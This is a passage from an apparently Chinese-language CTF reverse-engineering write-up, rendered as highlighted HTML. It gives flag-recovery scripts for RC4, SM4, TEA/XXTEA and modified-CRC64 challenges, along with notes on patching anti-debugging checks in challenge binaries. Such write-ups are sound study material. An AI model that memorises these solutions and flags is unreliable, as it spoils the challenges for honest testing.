class="number">153</span>,</span><br><span class="line">    <span class="number">6</span>, <span class="number">16</span>, <span class="number">93</span>, <span class="number">197</span>, <span class="number">105</span>, <span class="number">189</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">126</span>, <span class="number">227</span>,</span><br><span class="line">    <span class="number">103</span>, <span class="number">209</span>, <span class="number">255</span>, <span class="number">94</span>, <span class="number">249</span>, <span class="number">245</span>, <span class="number">65</span>, <span class="number">140</span>, <span class="number">221</span>, <span class="number">33</span>,</span><br><span class="line">    <span class="number">75</span>, <span class="number">167</span>, <span class="number">71</span>, <span class="number">134</span>, <span class="number">109</span>, <span class="number">195</span>, <span class="number">42</span>, <span class="number">154</span>, <span class="number">159</span>, <span class="number">32</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">187</span>, <span class="number">148</span>, <span class="number">185</span>, <span class="number">180</span>, <span class="number">146</span>, <span class="number">2</span>, <span class="number">116</span>, <span class="number">125</span>, <span class="number">27</span>,</span><br><span class="line">    <span class="number">30</span>, <span class="number">95</span>, <span class="number">186</span>, <span class="number">73</span>, <span class="number">214</span>, <span class="number">231</span>, <span class="number">83</span>, <span class="number">4</span>, <span class="number">203</span>, <span class="number">40</span>,</span><br><span class="line">    <span class="number">63</span>, <span class="number">232</span>, <span class="number">51</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">155</span>, <span class="number">106</span>, <span class="number">253</span>, <span class="number">190</span>, <span class="number">28</span>,</span><br><span class="line">    <span class="number">144</span>, <span class="number">237</span>, <span class="number">223</span>, <span class="number">77</span>, <span class="number">37</span>, <span class="number">111</span>, <span class="number">181</span>, <span class="number">19</span>, <span class="number">112</span>, <span class="number">60</span>,</span><br><span class="line">    <span class="number">158</span>, <span class="number">22</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">74</span>, <span class="number">115</span>, <span class="number">222</span>, <span class="number">177</span>, <span class="number">138</span>, <span class="number">81</span>,</span><br><span class="line">    <span class="number">59</span>, <span class="number">84</span>, <span class="number">20</span>, <span class="number">224</span>, <span class="number">90</span>, <span class="number">220</span>, <span class="number">145</span>, <span class="number">98</span>, <span class="number">163</span>, <span class="number">149</span>,</span><br><span class="line">    <span class="number">211</span>, <span class="number">58</span>, <span class="number">23</span>, <span class="number">238</span>, <span class="number">50</span>, <span class="number">242</span>, <span class="number">124</span>, <span class="number">175</span>, <span class="number">179</span>, <span class="number">136</span>,</span><br><span class="line">    <span class="number">236</span>, <span class="number">14</span>, <span class="number">174</span>, <span class="number">157</span>, <span class="number">92</span>, <span class="number">13</span>, <span class="number">85</span>, <span class="number">78</span>, <span class="number">251</span>, <span class="number">70</span>,</span><br><span class="line">    <span class="number">34</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">191</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">102</span>, <span class="number">7</span>, <span class="number">210</span>, <span class="number">54</span>,</span><br><span class="line">    <span class="number">147</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">26</span>, <span class="number">15</span>, <span class="number">233</span>, <span class="number">96</span>, <span class="number">202</span>, <span class="number">178</span>, <span class="number">108</span>,</span><br><span class="line">    <span class="number">131</span>, <span class="number">240</span>, <span class="number">3</span>, <span class="number">118</span>, <span class="number">168</span>, <span class="number">31</span>, <span class="number">99</span>, <span class="number">239</span>, <span class="number">165</span>, <span class="number">205</span>,</span><br><span class="line">    <span class="number">121</span>, <span class="number">123</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">171</span>, <span class="number">219</span>, <span class="number">212</span>, <span class="number">127</span>, <span class="number">1</span>, <span class="number">52</span>,</span><br><span class="line">    <span class="number">35</span>, <span class="number">89</span>, <span class="number">225</span>, <span class="number">41</span>, <span class="number">198</span>, <span class="number">172</span>, <span class="number">162</span>, <span class="number">64</span>, <span class="number">200</span>, <span class="number">173</span>,</span><br><span class="line">    <span class="number">196</span>, <span class="number">137</span>, <span class="number">194</span>, <span class="number">182</span>, <span class="number">113</span>, <span class="number">160</span>, <span class="number">235</span>, <span class="number">47</span>, <span class="number">120</span>, <span class="number">243</span>,</span><br><span class="line">    <span class="number">176</span>, <span class="number">254</span>, <span class="number">206</span>, <span class="number">247</span>, <span class="number">132</span>, <span class="number">114</span>, <span class="number">244</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">215</span>,</span><br><span class="line">    <span class="number">183</span>, <span class="number">142</span>, <span class="number">76</span>, <span class="number">130</span>, <span class="number">48</span>, <span class="number">80</span>, <span class="number">46</span>, <span class="number">36</span>, <span class="number">135</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">57</span>, <span class="number">229</span>, <span class="number">234</span>, <span class="number">166</span>, <span class="number">139</span>, <span class="number">21</span></span><br><span class="line">]</span><br><span class="line">print(len(sbox1))</span><br><span class="line">print(len(sbox2))</span><br><span class="line"></span><br><span class="line">key_bytes_1 = [</span><br><span class="line">    <span class="number">53</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">100</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">53</span>, <span class="number">100</span>, <span class="number">53</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">53</span>, <span class="number">110</span>, <span class="number">53</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">100</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">53</span>, <span class="number">100</span>,</span><br><span class="line">    <span class="number">53</span>, <span class="number">98</span>, <span class="number">53</span>, <span class="number">110</span>, <span class="number">53</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">100</span>, <span class="number">53</span>, <span class="number">119</span>,</span><br><span class="line">    <span class="number">53</span>, <span class="number">100</span>, <span class="number">53</span>, <span class="number">98</span>, <span class="number">53</span>, <span class="number">110</span>, <span class="number">142</span>, <span class="number">0</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">import urllib.parse</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def RC4(s_box, enc=<span class="string">&#x27;&#x27;):</span></span><br><span class="line"><span class="string">    i = j = 0</span></span><br><span class="line"><span class="string">    res = []</span></span><br><span class="line"><span class="string">    for s in enc:</span></span><br><span class="line"><span class="string">        i = (i + 1) % 256</span></span><br><span class="line"><span class="string">        j = (j + s_box[i]) % 256</span></span><br><span class="line"><span class="string">        s_box[i], s_box[j] = s_box[j], s_box[i]</span></span><br><span class="line"><span class="string">        t = (s_box[i] + s_box[j]) % 256</span></span><br><span class="line"><span class="string">        k = s_box[t]</span></span><br><span class="line"><span class="string">        res.append(chr(ord(s) ^ k))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return &#x27;</span><span class="string">&#x27;.join(res)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">enc_flag = &#x27;</span>+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;&#123;&#x27;</span><br><span class="line">dec_flag = RC4(sbox2, enc_flag)</span><br><span class="line">dec_flag2 = RC4(sbox1, dec_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(dec_flag2)):</span><br><span class="line">    print(chr(ord(dec_flag2[i]) - key_bytes_1[i] + ord(<span class="string">&#x27;p&#x27;</span>)), end=<span class="string">&#x27;&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207105721516.png" alt="image-20240207105721516" style="zoom:50%;" /><h2 id="6502">6502</h2><p><a href="https://codediy.github.io/nes-zh/easy6502/index.html#snake">https://codediy.github.io/nes-zh/easy6502/index.html#snake</a></p><p>在这里直接跑就行</p><h2 id="ezpython">ezpython</h2><p>用pyinstxtractor反编译后,分析可得是一个ECB模式的SM4,并且key和enc可以从secret中找到:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207120404910.png" alt="image-20240207120404910" style="zoom:50%;" /><p>但是SM4解密发现不正确,后来发现密钥在gmssl中的sm4.pyc中被魔改过,密钥被异或了37:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207120510078.png" alt="image-20240207120510078" style="zoom:50%;" /><p>修改解密脚本后再次运行得到flag:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from gmssl import sm4</span><br><span class="line"></span><br><span class="line"><span class="meta"># from secret import key, enc</span></span><br><span class="line">key = <span class="string">&#x27;BeginCTFBeginCTF&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;JmjJEAJGMT6F9bmC+Vyxy8Z1lpfaJzdEX6BGG/qgqUjUpQaYSON1CnZyX9YXTEClSRYm7PFZtGxmJw6LPuw1ww==&#x27;</span></span><br><span class="line">print(len(key))</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pad_pkcs7(data):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span>PKCS#<span class="number">7</span>填充<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    padding_len = <span class="number">16</span> - len(data) % <span class="number">16</span></span><br><span class="line">    padding = bytes([</span><br><span class="line">                        padding_len] * padding_len)</span><br><span class="line">    <span class="keyword">return</span> data + padding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def unpad_pkcs7(padded_data):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span>PKCS#<span class="number">7</span>去填充<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    padding_len = padded_data[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> padded_data[:-padding_len]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SM4:</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.gmsm4 = sm4.CryptSM4()</span><br><span class="line"></span><br><span class="line">    def encryptSM4(self, encrypt_key, value):</span><br><span class="line">        gmsm4 = self.gmsm4</span><br><span class="line">        gmsm4.set_key(encrypt_key.encode(), sm4.SM4_ENCRYPT)</span><br><span class="line">        padded_value = pad_pkcs7(value.encode())</span><br><span class="line">        encrypt_value = gmsm4.crypt_ecb(padded_value)</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(encrypt_value)</span><br><span class="line"></span><br><span class="line">    def decryptSM4(self, decrypt_key, value):</span><br><span class="line">        value = base64.b64decode(value)</span><br><span class="line">        print(value)</span><br><span class="line">        gmsm4 = self.gmsm4</span><br><span class="line">        gmsm4.set_key(decrypt_key.encode(), sm4.SM4_DECRYPT)</span><br><span class="line">        # 获取gmsm4的密钥</span><br><span class="line">        <span class="meta"># print(gmsm4.get_key())</span></span><br><span class="line">        decrypt_value = gmsm4.crypt_ecb(value)</span><br><span class="line">        print(decrypt_value)</span><br><span class="line">        input()</span><br><span class="line">        <span class="keyword">return</span> unpad_pkcs7(decrypt_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(<span class="string">&#x27;请输入你的flag:&#x27;</span>)</span><br><span class="line">    flag = input()</span><br><span class="line">    sm4_instance = SM4()</span><br><span class="line">    flag_1 = sm4_instance.encryptSM4(key, flag)</span><br><span class="line">    print(flag_1)</span><br><span class="line">    flag_2 = sm4_instance.decryptSM4(key, flag_1)</span><br><span class="line">    print(flag_2)</span><br><span class="line">    <span class="meta"># <span class="keyword">if</span> flag_1 != enc:</span></span><br><span class="line">    <span class="meta">#     print(<span class="string">&#x27;flag错误!!&#x27;</span>)</span></span><br><span class="line">    <span class="meta"># <span class="keyword">else</span>:</span></span><br><span class="line">    <span class="meta">#     print(<span class="string">&#x27;恭喜你获得flag😊😀&#x27;</span>)</span></span><br><span class="line">    print(flag_1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dec():</span><br><span class="line">    sm4_instance = SM4()</span><br><span class="line">    tmp_key = [chr(ord(i) ^ <span class="number">37</span>) <span class="keyword">for</span> i in key]</span><br><span class="line">    tmp_key = <span class="string">&#x27;&#x27;.join(tmp_key)</span></span><br><span class="line"><span class="string">    flag = sm4_instance.decryptSM4(tmp_key, enc)</span></span><br><span class="line"><span class="string">    print(flag)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="number">&#x27;</span>:</span><br><span class="line">    <span class="meta"># main()</span></span><br><span class="line">    dec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240207120547409.png" alt="image-20240207120547409" style="zoom:50%;" /><h2 id="stick-game">Stick Game</h2><p>这题很简单,直接在线反混淆,搜索那个关键的分数,就找到flag了.</p><h2 id="not-main">not_main</h2><p>VEH反调试,第二次加密为XXTEA,在全局类的析构函数中,引发除0异常进入handler()方法进行加密.</p><p>当时没做出来,以为只有这个加密,忘记了main()中那个加密.</p><p>(实际上是不知道这个异常何时引发,导致没想到main()这个加密依旧会执行)</p><p>标准TEA加密+标准XXTEA加密,分析清楚反调试后很简单:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;rounds = %d\n&quot;</span>, rounds);</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TEA_decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">32</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// second encrypt function at Handler()</span></span><br><span class="line">    <span class="comment">// XXTEA</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// at 0x0100503C</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc_data[] = &#123;</span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x0F</span>, <span class="number">0xBE</span>, <span class="number">0xCF</span>, <span class="number">0x3F</span>, <span class="number">0x08</span>, <span class="number">0xF3</span>, <span class="number">0x05</span>, <span class="number">0x3B</span>, <span class="number">0xE4</span>,</span><br><span class="line">        <span class="number">0x20</span>, <span class="number">0x42</span>, <span class="number">0xEE</span>, <span class="number">0xAF</span>, <span class="number">0x83</span>, <span class="number">0x33</span>, <span class="number">0xCE</span>, <span class="number">0x37</span>, <span class="number">0x32</span>, <span class="number">0xFA</span>,</span><br><span class="line">        <span class="number">0x6E</span>, <span class="number">0xA6</span>, <span class="number">0xAD</span>, <span class="number">0xEC</span>, <span class="number">0xA7</span>, <span class="number">0x7C</span>, <span class="number">0xD4</span>, <span class="number">0xA8</span>, <span class="number">0x77</span>, <span class="number">0x10</span>,</span><br><span class="line">        <span class="number">0xC5</span>, <span class="number">0xEF</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> *v = (<span class="type">uint32_t</span> *)enc_data;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>] = &#123; <span class="number">0x74</span>,<span class="number">0x72</span>,<span class="number">0x75</span>,<span class="number">0x65</span> &#125;;</span><br><span class="line">    <span class="type">int</span> n; <span class="comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    n = <span class="keyword">sizeof</span>(enc_data) / <span class="keyword">sizeof</span>(enc_data[<span class="number">0</span>]) / <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">char</span> *)v); <span class="comment">//输出加密前的数据</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-DELTA = %#x\n&quot;</span>, -DELTA);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n = %d\n&quot;</span>, n);</span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">char</span> *)v); <span class="comment">//输出解密后的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> k2[<span class="number">4</span>] = &#123; <span class="number">0x66</span>,<span class="number">0x61</span>,<span class="number">0x6b</span>,<span class="number">0x65</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i += <span class="number">2</span>) &#123;</span><br><span class="line">        TEA_decrypt(v + i, (<span class="type">uint32_t</span> *)k2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">char</span> *)v); <span class="comment">//输出解密后的数据</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240210115521308.png" alt="image-20240210115521308" style="zoom:50%;" /><h2 id="出题人的密码是什么">出题人的密码是什么</h2><p>开局啥也别管,先把反调试给绕过了,有4个反调试,都在main函数中,前2个是调用Win32API进行检查,后2个是获取时间戳,都使用if语句进行判断,直接把jz,jg给patch成jnz和jle即可,结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240213111000836.png" alt="image-20240213111000836" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240213111323938.png" alt="image-20240213111323938" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240213111349029.png" alt="image-20240213111349029" style="zoom:50%;" /><p>输入输出和检查没什么问题,找加密函数并重命名:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240213111509708.png" alt="image-20240213111509708" style="zoom:50%;" /><p>进入:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240213111535637.png" alt="image-20240213111535637" style="zoom:50%;" /><p>进入:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240213111553478.png" alt="image-20240213111553478" style="zoom:50%;" /><p>最后在这里:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240213111626836.png" alt="image-20240213111626836" style="zoom:50%;" /><p>第2个很简单,异或常数然后偏移,重点第1个(据官方WP说是魔改的CRC64):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240213111713843.png" alt="image-20240213111713843" style="zoom:50%;" /><p>v2的值直接动调得到,加密将48字节的数据分成6个64位块,进行64次循环加密.</p><p>比大小实际上是检查高位是否为1,选择是否与v2异或.</p><p>尽管看起来有数据丢失,但是v2的值是<code>0x33077D</code>,最低位是1,被异或的值(变量tmp)首先被乘2,也就是左移1位.</p><p>最低位一定被补0,如果和v2异或过,那么该位结果一定是1.</p><p>因此每轮循环仅需要检查密文的最低位即可确定走了哪条分支.</p><p>提取数据很简单,解密脚本如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> v2 = <span class="number">0x33077D</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> maybe_enc_data[] = &#123;</span><br><span class="line">        <span class="number">0xb4</span>, <span class="number">0xbb</span>, <span class="number">0xd8</span>, <span class="number">0xeb</span>, <span class="number">0xd0</span>, <span class="number">0x6e</span>, <span class="number">0xab</span>, <span class="number">0xca</span>,</span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x8e</span>, <span class="number">0x4b</span>, <span class="number">0xe9</span>, <span class="number">0x4d</span>, <span class="number">0xd4</span>, <span class="number">0x4a</span>, <span class="number">0xf3</span>, <span class="number">0x7d</span>, <span class="number">0x29</span>,</span><br><span class="line">        <span class="number">0xc2</span>, <span class="number">0xf9</span>, <span class="number">0x95</span>, <span class="number">0x89</span>, <span class="number">0xa4</span>, <span class="number">0x85</span>, <span class="number">0x9d</span>, <span class="number">0xcd</span>,</span><br><span class="line">        <span class="number">0xdf</span>, <span class="number">0x77</span>, <span class="number">0xfd</span>,<span class="number">0x45</span>, <span class="number">0xcb</span>, <span class="number">0x5d</span>, <span class="number">0x7d</span>, <span class="number">0xfd</span>,</span><br><span class="line">        <span class="number">0x93</span>, <span class="number">0x4b</span>, <span class="number">0xbc</span>, <span class="number">0xf6</span>, <span class="number">0x7c</span>, <span class="number">0xf3</span>, <span class="number">0x24</span>,</span><br><span class="line">        <span class="number">0x42</span>, <span class="number">0xf5</span>, <span class="number">0xd2</span>, <span class="number">0xdd</span>, <span class="number">0xe3</span>, <span class="number">0x56</span>, <span class="number">0xae</span>,<span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span 